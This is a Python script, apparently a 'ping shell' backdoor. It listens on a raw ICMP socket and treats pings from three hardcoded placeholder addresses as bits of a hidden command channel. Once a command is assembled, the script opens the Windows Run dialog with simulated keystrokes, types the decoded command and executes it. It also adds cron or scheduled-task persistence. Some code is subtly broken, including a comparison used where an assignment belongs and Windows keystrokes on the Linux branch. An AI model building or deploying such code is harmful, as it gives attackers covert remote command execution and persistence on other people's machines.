import socket
import io
import os
import time
import platform
import subprocess
from datetime import datetime, timedelta
from crontab import CronTab
from pynput.keyboard import Controller, Key

def press_windows_r():
    keyboard = Controller()
    keyboard.press(Key.cmd)
    keyboard.press('r')
    keyboard.release('r')
    keyboard.release(Key.cmd)

def read_binary_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            binary_str = file.read().replace(" ", "").strip()
            return binary_str
    except FileNotFoundError:
        return None

def binary_to_text(binary_str):
    try:
        chunks = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)]
        text = "".join(chr(int(chunk, 2)) for chunk in chunks)
        return text
    except ValueError:
        return None

def type_text(text):
    keyboard = Controller()
    keyboard.type(text)

def exectute_payload():
    keyboard = Controller()
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    keyboard.press(Key.left)
    keyboard.release(Key.left)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

def create_cron_job(python_file_path, interval=None, run_once=False):
    python_file_path = os.path.abspath(python_file_path)
    python_interpreter = os.path.abspath('python')

    system = platform.system()
    
    if system == 'Linux':
        cron = CronTab(user=True)
        if run_once:
            run_time = datetime.now() + timedelta(minutes=1)
            minute = run_time.minute
            hour = run_time.hour
            day = run_time.day
            month = run_time.month
            job = cron.new(command=f'{python_interpreter} {python_file_path}', comment='One-time Python script')
            job.setall(f'{minute} {hour} {day} {month} *')
        else:
            job = cron.new(command=f'{python_interpreter} {python_file_path}', comment='Recurring Python script')
            job.setall(interval or '* * * * *')
        
        cron.write()
        print(f"Cron job created on Linux to run {python_file_path} {'one time' if run_once else 'at interval ' + (interval if interval else '* * * * *')}")
    
    elif system == 'Windows':
        task_name = 'MyPythonScript'
        if run_once:
            run_time = datetime.now() + timedelta(minutes=1)
            start_time = run_time.strftime('%H:%M')
            start_date = run_time.strftime('%m/%d/%Y')
            
            command = f'schtasks /create /tn {task_name} /tr "{python_interpreter} {python_file_path}" /sc once /st {start_time} /sd {start_date} /f'
        else:
            trigger_type = 'DAILY'
            if interval == '* * * * *':
                trigger_type = 'MINUTE'
            elif interval == '0 0 * * *':
                trigger_type is 'DAILY'
            
            command = f'schtasks /create /tn {task_name} /tr "{python_interpreter} {python_file_path}" /sc {trigger_type} /f'
        
        try:
            subprocess.run(command, check=True, shell=True)
            print(f"Scheduled task created on Windows to run {python_file_path} {'one time' if run_once else 'with trigger ' + trigger_type}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to create scheduled task on Windows: {e}")
    else:
        raise OSError("Unsupported operating system")

def main():
    addr1 = "420.69.96.421"
    addr2 = "420.69.96.422"
    addr3 = "420.69.96.423"
    file_path = "config.txt"

    with io.open(file_path, 'w', encoding='utf-8') as file:
        file.write("config placeholder")

    #create_cron_job("./pingshell_encode_decode.py", run_once=True)

    try:
        if platform.system() == 'Windows':
            # On Windows, create a raw socket using IPPROTO_ICMP instead of IPPROTO_IP
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
                s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
                print("Raw socket created successfully.")
                while True:
                    try:
                        packet, addr = s.recvfrom(1024)
                        print(f"Received packet from {addr[0]}")
                        if addr[0] == addr1:
                            print("do stuff here")
                            with open("incoming.txt", "a") as file:
                                file.write("0")
                        elif addr[0] == addr2:
                            print("other stuff here")
                            with open("incoming.txt", "a") as file:
                                file.write("1")
                        elif addr[0] == addr3:
                            print("received ping from 3rd address")
                            file_path = "incoming.txt"
                            binary_str = read_binary_from_file(file_path)

                            if binary_str:
                                plaintext = binary_to_text(binary_str)
                                if plaintext:
                                    press_windows_r()
                                    time.sleep(1)
                                    type_text(plaintext)
                                    open('incoming.txt', 'w').close()
                                    exectute_payload()

                                else:
                                    print("Invalid binary input")
                            else:
                                print(f"File '{file_path}' not found")
                        else:
                            print("unexpected ping address")
                            time.sleep(1)
                    except socket.error as recv_err:
                        print(f"Error receiving data: {recv_err}")
                        time.sleep(1)
        else:
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
                print("Raw socket created successfully.")
                while True:
                    try:
                        packet, addr = s.recvfrom(1024)
                        print(f"Received ping from {addr[0]}")
                        if addr[0] == addr1:
                            print("do stuff here")
                            with open("incoming.txt", "a") as file:
                                file.write("0")
                        elif addr[0] == addr2:
                            print("other stuff here")
                            with open("incoming.txt", "a") as file:
                                file.write("1")
                        elif addr[0] == addr3:
                            print("received ping from 3rd address")
                            file_path = "incoming.txt"
                            binary_str = read_binary_from_file(file_path)

                            if binary_str:
                                plaintext = binary_to_text(binary_str)
                                if plaintext:
                                    press_windows_r()
                                    time.sleep(1)
                                    type_text(plaintext)
                                    exectute_payload()
                                else:
                                    print("Invalid binary input")
                            else:
                                print(f"File '{file_path}' not found")
                        else:
                            print("unexpected ping address")
                            time.sleep(1)
                    except socket.error as recv_err:
                        print(f"Error receiving data: {recv_err}")
                        time.sleep(1)
    except socket.error as sock_err:
        print(f"Socket creation failed: {sock_err}. Ensure you are running the script with appropriate privileges.")

if __name__ == "__main__":
    main()#remove this after testing to allow cron jobs to run

